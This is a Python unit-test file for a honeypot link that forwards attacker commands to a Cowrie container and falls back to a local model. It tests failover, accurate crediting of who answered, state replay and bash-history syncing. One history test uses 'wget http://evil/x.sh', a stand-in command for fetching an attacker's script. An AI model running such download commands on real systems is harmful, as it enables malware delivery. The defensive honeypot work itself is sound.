"""
tests/test_cowrie_link.py — talking to the Cowrie container.

The container is a stub here and the fallback is a plain callable, so none of
this needs Docker or a model.

Run:  python3 -m unittest discover -s tests -p "test_cowrie_link.py" -v
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shell.cowrie_link import CowrieLink          # noqa: E402


class StubShell:
    def __init__(self):
        self.written = []

    def send(self, data):
        self.written.append(data)


class StubCowrie:
    """Records everything. `raise_on` makes one call fail, the way a dead
    container does."""

    def __init__(self, raise_on=None, available=True):
        self.sent = []
        self.streamed = []
        self.raise_on = raise_on
        self.available = available
        self.shell = StubShell()
        self.drained = []
        self.connects = 0

    def send(self, cmd):
        if self.raise_on and self.raise_on in cmd:
            raise ConnectionError("container gone")
        self.sent.append(cmd)
        return f"out:{cmd}", "cowrie"

    def send_streaming(self, cmd, write_fn):
        if self.raise_on and self.raise_on in cmd:
            raise ConnectionError("container gone")
        self.streamed.append(cmd)
        write_fn(f"out:{cmd}")
        return f"out:{cmd}", "cowrie"

    def _connect(self):
        self.connects += 1

    def _collect_until_prompt(self, cmd, timeout=2.0):
        self.drained.append(cmd)
        return ("", "")


def link(**kw):
    cowrie = StubCowrie(**{k: v for k, v in kw.items() if k in ("raise_on", "available")})
    calls = []

    def fallback(cmd):
        calls.append(cmd)
        return f"model:{cmd}", "on_device"

    return CowrieLink(cowrie, fallback=fallback, log=None), cowrie, calls


class TestSend(unittest.TestCase):

    def test_a_healthy_container_answers_and_is_credited(self):
        link_, cowrie, calls = link()
        self.assertEqual(link_.send("ls"), ("out:ls", "cowrie"))
        self.assertEqual(cowrie.sent, ["ls"])
        self.assertEqual(calls, [])

    def test_write_fn_streams_instead_of_returning_in_one_go(self):
        link_, cowrie, _ = link()
        chunks = []
        link_.send("apt install nmap", write_fn=chunks.append)
        self.assertEqual(chunks, ["out:apt install nmap"])
        self.assertEqual(cowrie.streamed, ["apt install nmap"])

    def test_a_dead_container_degrades_instead_of_going_silent(self):
        """Silence on nearly everything is the loudest possible tell that the
        box is fake."""
        link_, cowrie, calls = link(raise_on="ls")
        self.assertEqual(link_.send("ls"), ("model:ls", "on_device"))
        self.assertEqual(calls, ["ls"])

    def test_the_log_records_who_actually_answered(self):
        """Crediting Cowrie for the model's output would make the dataset lie."""
        link_, _, _ = link(raise_on="ls")
        self.assertEqual(link_.send("ls")[1], "on_device")

    def test_the_outage_is_remembered_so_later_commands_are_routed_away(self):
        link_, cowrie, _ = link(raise_on="ls")
        self.assertTrue(link_.available)
        link_.send("ls")
        self.assertFalse(link_.available)

    def test_with_no_fallback_an_outage_is_empty_not_an_exception(self):
        cowrie = StubCowrie(raise_on="ls")
        bare = CowrieLink(cowrie, fallback=None, log=None)
        self.assertEqual(bare.send("ls"), ("", "cowrie"))

    def test_a_broken_fallback_still_does_not_raise_into_the_session(self):
        cowrie = StubCowrie(raise_on="ls")

        def boom(cmd):
            raise RuntimeError("model down too")

        self.assertEqual(CowrieLink(cowrie, fallback=boom, log=None).send("ls"),
                         ("", "on_device"))


class TestFallbackCommand(unittest.TestCase):
    """Cowrie runs what the attacker typed; the model is prompted with the
    normalised form every other path uses."""

    def test_cowrie_gets_the_raw_command_and_the_model_the_normalised_one(self):
        link_, cowrie, calls = link(raise_on="sudo")
        out, agent = link_.send("sudo ls -la", fallback_cmd="ls -la")
        self.assertEqual(out, "model:ls -la")
        self.assertEqual(calls, ["ls -la"])

    def test_without_it_the_command_is_passed_through_unchanged(self):
        link_, _, calls = link(raise_on="sudo")
        link_.send("sudo ls -la")
        self.assertEqual(calls, ["sudo ls -la"])


class TestSync(unittest.TestCase):

    def test_a_state_change_is_replayed_into_the_container(self):
        """touch/mkdir/chmod are answered locally, but the effect must exist on
        both sides or a later routed command sees a different machine."""
        link_, cowrie, _ = link()
        link_.sync("mkdir /tmp/x")
        self.assertEqual(cowrie.sent, ["mkdir /tmp/x"])

    def test_it_swallows_failures_rather_than_breaking_the_session(self):
        link_, _, _ = link(raise_on="mkdir")
        link_.sync("mkdir /tmp/x")          # must not raise

    def test_sync_does_not_mark_the_container_dead(self):
        """It is best effort. A failed replay costs consistency, not routing."""
        link_, _, _ = link(raise_on="mkdir")
        link_.sync("mkdir /tmp/x")
        self.assertTrue(link_.available)


class TestSyncHistory(unittest.TestCase):

    def test_the_command_is_appended_to_bash_history(self):
        link_, cowrie, _ = link()
        link_.sync_history("wget http://evil/x.sh")
        self.assertIn("history -s 'wget http://evil/x.sh'", cowrie.shell.written[0])
        self.assertIn("history -w", cowrie.shell.written[0])

    def test_quotes_in_the_command_cannot_break_out_of_the_quoting(self):
        link_, cowrie, _ = link()
        link_.sync_history("echo 'hi'")
        self.assertIn(r"""'echo '\''hi'\'''""", cowrie.shell.written[0])

    def test_it_drains_to_the_prompt_rather_than_sleeping(self):
        """A one-shot drain can miss trailing output under load, leaving this
        command's echo to bleed into a LATER command's response."""
        link_, cowrie, _ = link()
        link_.sync_history("ls")
        self.assertEqual(len(cowrie.drained), 1)

    def test_a_known_outage_is_skipped_entirely(self):
        """Otherwise every keystroke attempts its own reconnect and prints its
        own failure -- one line per command, filling the disk."""
        link_, cowrie, _ = link(available=False)
        link_.sync_history("ls")
        self.assertEqual(cowrie.shell.written, [])
        self.assertEqual(cowrie.connects, 0)

    def test_a_dead_socket_is_reconnected_and_retried_once(self):
        link_, cowrie, _ = link()
        calls = {"n": 0}
        original = cowrie.shell.send

        def flaky(data):
            calls["n"] += 1
            if calls["n"] == 1:
                raise OSError("socket closed")
            original(data)

        cowrie.shell.send = flaky
        link_.sync_history("ls")
        self.assertEqual(cowrie.connects, 1)
        self.assertEqual(len(cowrie.shell.written), 1)

    def test_an_unreachable_container_warns_once_per_outage_not_per_command(self):
        logged = []
        cowrie = StubCowrie()

        def dead(data):
            raise OSError("gone")

        cowrie.shell.send = dead
        link_ = CowrieLink(cowrie, fallback=None, log=logged.append)
        for _ in range(5):
            link_.sync_history("ls")
        self.assertEqual(len(logged), 1)
        self.assertIn("history sync paused", logged[0])


if __name__ == "__main__":
    unittest.main(verbosity=2)
